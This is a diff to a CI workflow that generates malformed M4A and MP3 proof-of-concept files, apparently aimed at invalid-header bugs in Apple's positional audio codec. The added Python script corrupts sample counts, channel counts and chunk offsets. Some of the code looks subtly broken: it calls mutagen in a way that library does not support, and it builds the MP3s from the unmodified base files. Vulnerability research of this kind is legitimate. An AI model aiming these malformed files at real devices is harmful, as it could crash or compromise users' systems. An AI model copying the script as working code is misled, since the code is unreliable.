@@ -31,16 +31,17 @@ jobs:
           key: ffmpeg-${{ runner.os }}-2025-06
           restore-keys: ffmpeg-${{ runner.os }}-
 
-      # Install FFmpeg
-      - name: Install FFmpeg
+      # Install FFmpeg and Python dependencies
+      - name: Install FFmpeg and Python dependencies
         run: |
-          echo "Installing FFmpeg at $(date)"
+          echo "Installing FFmpeg and Python dependencies at $(date)"
           if ! command -v ffmpeg &> /dev/null; then
             brew install ffmpeg
           else
             echo "FFmpeg already installed"
           fi
-          echo "FFmpeg installed at $(date)"
+          pip3 install mutagen
+          echo "FFmpeg and Python dependencies installed at $(date)"
 
       # Set up Xcode
       - name: Set up Xcode
@@ -150,6 +151,105 @@ jobs:
           ls -l generate_pocs.swift
           echo "generate_pocs.swift created at $(date)"
 
+      # Create manipulate_pocs.py
+      - name: Create manipulate_pocs.py
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Creating manipulate_pocs.py at $(date)"
+          cat << 'EOF' > manipulate_pocs.py
+          from mutagen.mp4 import MP4, MP4StreamInfoError
+          import os
+          import subprocess
+
+          def manipulate_poc1(input_file, output_m4a):
+              try:
+                  mp4 = MP4(input_file)
+                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
+                      stsz = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsz']
+                      stsz['sample_count'] = 8192
+                      mp4.save(output_m4a)
+                      print(f"PoC 1: Set stsz sample count to 8192 in {output_m4a}")
+                  else:
+                      raise ValueError("Invalid MP4 structure for PoC 1")
+              except Exception as e:
+                  print(f"PoC 1 M4A error: {e}")
+                  raise
+
+          def manipulate_poc2(input_file, output_m4a):
+              try:
+                  mp4 = MP4(input_file)
+                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
+                      esds = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsd']['mp4a'][0]['esds']
+                      esds_data = bytearray(esds['esds'])
+                      esds_data[0x1B] = 8
+                      esds['esds'] = bytes(esds_data)
+                      mp4.save(output_m4a)
+                      print(f"PoC 2: Set esds channel count to 8 in {output_m4a}")
+                  else:
+                      raise ValueError("Invalid MP4 structure for PoC 2")
+              except Exception as e:
+                  print(f"PoC 2 M4A error: {e}")
+                  raise
+
+          def manipulate_poc5(input_file, output_m4a):
+              try:
+                  mp4 = MP4(input_file)
+                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
+                      stco = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stco']
+                      stco['entry_list'] = [[0xFFFFFFFF]]
+                      mp4.save(output_m4a)
+                      print(f"PoC 5: Set invalid stco offset in {output_m4a}")
+                  else:
+                      raise ValueError("Invalid MP4 structure for PoC 5")
+              except Exception as e:
+                  print(f"PoC 5 M4A error: {e}")
+                  raise
+
+          def generate_mp3(input_file, output_mp3, poc_number):
+              try:
+                  cmd = ["ffmpeg", "-i", input_file, "-c:a", "mp3", "-ac", "1"]
+                  if poc_number == 3:
+                      cmd.extend(["-b:a", "128k", "-metadata", "frames=20000"])
+                      print(f"PoC 3: Generating {output_mp3} with Xing frames=20000")
+                  elif poc_number == 4:
+                      cmd.extend(["-b:a", "320k"])
+                      print(f"PoC 4: Generating {output_mp3} with 320 kbps bitrate")
+                  else:
+                      cmd.extend(["-b:a", "128k"])
+                      print(f"PoC {poc_number}: Generating {output_mp3} with default settings")
+                  cmd.append(output_mp3)
+                  result = subprocess.run(cmd, capture_output=True, text=True)
+                  if result.returncode != 0:
+                      raise RuntimeError(f"FFmpeg error: {result.stderr}")
+              except Exception as e:
+                  print(f"PoC {poc_number} MP3 error: {e}")
+                  raise
+
+          def main():
+              for i in range(1, 6):
+                  input_file = f"base_poc{i}.m4a"
+                  output_m4a = f"poc{i}.m4a"
+                  output_mp3 = f"poc{i}.mp3"
+                  if not os.path.exists(input_file):
+                      print(f"Error: {input_file} not found")
+                      exit(1)
+                  if i == 1:
+                      manipulate_poc1(input_file, output_m4a)
+                  elif i == 2:
+                      manipulate_poc2(input_file, output_m4a)
+                  elif i == 3 or i == 4:
+                      os.system(f"cp {input_file} {output_m4a}")
+                      print(f"Copied {input_file} to {output_m4a} for PoC {i}")
+                  elif i == 5:
+                      manipulate_poc5(input_file, output_m4a)
+                  generate_mp3(input_file, output_mp3, i)
+
+          if __name__ == "__main__":
+              main()
+          EOF
+          ls -l manipulate_pocs.py
+          echo "manipulate_pocs.py created at $(date)"
+
       # Create PoC source files
       - name: Create PoC source files
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
@@ -191,67 +291,14 @@ jobs:
           ls -l base_poc*.m4a
           echo "Base M4A files generated at $(date)"
 
-      # Manipulate M4A files for PoCs
-      - name: Manipulate M4A files for PoCs
+      # Manipulate M4A and generate MP3 files
+      - name: Manipulate M4A and generate MP3 files
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Manipulating M4A files for PoCs at $(date)"
-          # Install mp4box
-          brew install gpac
-          # PoC 1: Inflate stsz sample count
-          cp base_poc1.m4a poc1.m4a
-          mp4box -raw 1 poc1.m4a -out temp.aac
-          mp4box -add temp.aac:srate=44100:ch=2:frames=8192 poc1_modified.m4a
-          mv poc1_modified.m4a poc1.m4a
-          
-          # PoC 2: esds channel mismatch
-          cp base_poc2.m4a poc2.m4a
-          mp4box -raw 1 poc2.m4a -out temp.aac
-          mp4box -add temp.aac:srate=44100:ch=8 poc2_modified.m4a
-          mv poc2_modified.m4a poc2.m4a
-          
-          # PoC 3: Prepare for Xing metadata
-          cp base_poc3.m4a poc3.m4a
-          
-          # PoC 4: Bitrate mismatch
-          cp base_poc4.m4a poc4.m4a
-          
-          # PoC 5: stco offset overflow
-          cp base_poc5.m4a poc5.m4a
-          # Simplified stco manipulation (requires custom tool for precision)
-          printf '\xFF\xFF\xFF\xFF' | dd of=poc5.m4a bs=1 seek=1200 conv=notrunc 2>/dev/null
-          
-          ls -l poc*.m4a
-          echo "M4A files manipulated at $(date)"
-
-      # Convert M4A to MP3
-      - name: Convert M4A to MP3
-        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
-        run: |
-          echo "Converting M4A to MP3 at $(date)"
-          for poc in {1..5}; do
-            if [ -f poc${poc}.m4a ]; then
-              if [ $poc -eq 3 ]; then
-                echo "Adding Xing metadata for PoC 3"
-                ffmpeg -i poc3.m4a -c:a mp3 -b:a 128k -ac 1 -metadata frames=20000 poc3.mp3
-              elif [ $poc -eq 4 ]; then
-                echo "Setting high bitrate for PoC 4"
-                ffmpeg -i poc4.m4a -c:a mp3 -b:a 320k -ac 1 poc4.mp3
-              else
-                ffmpeg -i poc${poc}.m4a -c:a mp3 -b:a 128k -ac 1 poc${poc}.mp3
-              fi
-              if [ $? -eq 0 ]; then
-                echo "Conversion successful for poc${poc}.mp3"
-              else
-                echo "Conversion failed for poc${poc}.mp3"
-                exit 1
-              fi
-            else
-              echo "poc${poc}.m4a not found"
-              exit 1
-            fi
-          done
-          echo "M4A to MP3 conversion completed at $(date)"
+          echo "Manipulating M4A and generating MP3 files at $(date)"
+          python3 manipulate_pocs.py
+          ls -l poc*.m4a poc*.mp3
+          echo "M4A and MP3 files generated at $(date)"
 
       # Verify generated files
       - name: Verify generated files
